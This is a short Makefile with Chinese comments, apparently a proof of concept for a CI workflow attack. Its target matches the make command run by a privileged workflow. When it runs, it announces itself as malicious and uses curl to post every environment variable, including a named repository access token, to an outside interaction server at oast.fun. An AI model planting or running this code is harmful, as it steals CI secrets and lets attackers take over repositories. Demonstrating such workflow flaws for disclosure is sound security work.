# 这个 Makefile 会被高权限的工作流执行
# 目标 pr/auto-format/host 会匹配工作流中的 `make` 命令
pr/auto-format/host:
	# 打印一些信息来确认我们的代码被执行了
	@echo "=========================================="
	@echo "=== [SUCCESS] Malicious Makefile is running! ==="
	@echo "=========================================="
	@echo "Stealing secrets and sending them to attacker's server..."

	# 使用 curl 将所有环境变量（包含 secrets.PUBLIC_REPO_ACCESS_TOKEN）
	# 发送到攻击者控制的服务器（例如 webhook.site）
	@curl -X POST -d "`env`" https://bqiehrpshxqkxlzvdxgcudws0rbj9r66v.oast.fun/terraform-aws-multi-az-subnets

	@echo "Secrets have been sent. Check your webhook."
